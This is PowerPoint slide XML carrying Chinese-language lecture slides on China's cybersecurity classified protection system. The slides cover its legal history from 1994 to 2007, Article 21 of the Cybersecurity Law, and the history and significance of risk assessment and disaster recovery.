          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>1994</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>年国务院颁布的 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>中华人民共和国计算机信息系统安全保护条例</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>规定：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>计算机信息系统实行安全等级保护，安全等级的划分标准和安全等级保护的具体办法，由公安部会同有关部门制定</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="764704"/>
            <a:ext cx="4512774" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>网络空间安全等级保护制度</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="+mj-lt"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="矩形 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683642" y="4797152"/>
            <a:ext cx="7672672" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>2007</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>月，公安部、国家保密局、国家密码管理局、国务院信息化工作办公室制定了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>信息安全等级保护管理办法</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>，明确了信息安全等级保护的具体要求。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="矩形 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="719602" y="2582762"/>
            <a:ext cx="8248736" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>1999</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>9</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>月</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>13</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>日国家发布</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>计算机信息系统安全保护等级划分准则</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="矩形 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683642" y="3104335"/>
            <a:ext cx="7672672" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>2003</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>年中央办公厅、国务院办公厅转发</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国家信息化领导小组关于加强信息安全保障工作的意见</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6666FF"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>（中办发 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>[2003]27 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>号）明确指出，“要重点保护基础信息网络和关系国家安全、经济命脉、社会稳定等方面的重要信息系统，抓紧建立信息安全等级保护制度，制定信息安全等级保护的管理办法和技术指南”。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38641584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Lst>
  </p:timing>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467544" y="1700808"/>
            <a:ext cx="5544616" cy="4062651"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>第二十一条 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>（四）采取</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>数据分类</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>、重要数据备份和加密等措施；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>（五）法律、行政法规规定的其他义务。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="107504" y="692696"/>
            <a:ext cx="6497291" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>网络安全法</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>中的信息安全等级保护 </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRP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4168" y="2013325"/>
            <a:ext cx="2728008" cy="2329619"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19498576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96752"/>
            <a:ext cx="9144000" cy="5112568"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="381000" y="729293"/>
            <a:ext cx="3611886" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全等级保护：示例 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2831244039"/>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755649"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全风险评估</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="3284984"/>
            <a:ext cx="8191500" cy="2376264"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>实践历程</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>2003</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>年，国信办成立课题组，启动了信息安全风险评估工作</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>2005</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>年，国务院信息办组织开展了国家基础信息网络和重要信息系统信息安全风险评估试点工作</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>2006</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>年起，每年都组织风险评估专控队伍对全国基础信息网络和重要信息系统进行检查</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="1519817"/>
            <a:ext cx="7272808" cy="1631216"/>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意义</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="28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网络空间安全建设的起点和基础</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网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全建设和管理的科学方法</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pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>倡导适度安全</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34935970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875674"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>灾难恢复</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="827584" y="3573016"/>
            <a:ext cx="7878266" cy="2088232"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>实践历程</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>2000</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>年的“千年虫”事件和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>2001</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>年的“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>9.11”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>事件引发了国内对信息系统灾难的关注</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>2004</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>9</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>月，国信办印发了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>关于做好重要信息系统灾难备份工作的通知</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>（信安通</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>[2004]11</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>号）</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="931733" y="1720001"/>
            <a:ext cx="7200800" cy="1508105"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>意义</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>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保持业务连续运作的需要，长期可持续发展的要求</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对现有信息系统安全保护的延伸，是网络空间安全综合保障的最后一道防线</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3134246670"/>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标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
